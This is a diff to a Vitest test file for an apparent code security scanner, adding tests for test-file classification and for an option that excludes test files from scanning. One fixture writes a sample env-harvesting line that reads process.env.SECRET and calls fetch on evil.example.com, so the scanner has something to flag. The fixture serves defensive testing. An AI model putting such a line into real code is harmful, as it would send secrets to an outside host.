@@ -6,6 +6,7 @@ import { afterEach, describe, expect, it, vi } from "vitest";
 import {
   clearSkillScanCacheForTest,
   isScannable,
+  isTestFile,
   scanDirectory,
   scanDirectoryWithSummary,
   scanSource,
@@ -226,6 +227,23 @@ describe("isScannable", () => {
     ["style.css", false],
   ] as const)("classifies %s", (fileName, expected) => {
     expect(isScannable(fileName)).toBe(expected);
+  });
+});
+
+describe("isTestFile", () => {
+  it.each([
+    ["provider.proxy.test.ts", true],
+    ["thread-bindings.lifecycle.test.ts", true],
+    ["component.spec.tsx", true],
+    ["helper.mock.ts", true],
+    ["index.test.js", true],
+    ["util.spec.mjs", true],
+    ["index.ts", false],
+    ["proxy-server.ts", false],
+    ["test-helpers.ts", false],
+    ["testing-utils.ts", false],
+  ] as const)("classifies %s as test=%s", (fileName, expected) => {
+    expect(isTestFile(fileName)).toBe(expected);
   });
 });
 
@@ -762,5 +780,31 @@ describe("scanDirectoryWithSummary", () => {
 
     expect(readdirSpy).toHaveBeenCalledTimes(1);
     readdirSpy.mockRestore();
+  });
+
+  it("excludes test files when excludeTestFiles is true", async () => {
+    const root = makeTmpDir();
+    // A test file with a dangerous pattern — should be ignored
+    fsSync.writeFileSync(
+      path.join(root, "provider.proxy.test.ts"),
+      `process.env.SECRET; fetch("http://evil.example.com");`,
+    );
+    // A regular source file — still gets scanned
+    fsSync.writeFileSync(path.join(root, "index.ts"), `export const ok = true;`);
+
+    const withExclusion = await scanDirectoryWithSummary(root, { excludeTestFiles: true });
+    const withoutExclusion = await scanDirectoryWithSummary(root, { excludeTestFiles: false });
+
+    // The test file's env-harvesting finding should not appear when excluded
+    const testFileFindings = withExclusion.findings.filter((f) =>
+      f.file?.includes("proxy.test.ts"),
+    );
+    expect(testFileFindings).toHaveLength(0);
+
+    // Without exclusion the same file should produce findings
+    const testFileFindingsNoExcl = withoutExclusion.findings.filter((f) =>
+      f.file?.includes("proxy.test.ts"),
+    );
+    expect(testFileFindingsNoExcl.length).toBeGreaterThan(0);
   });
 });
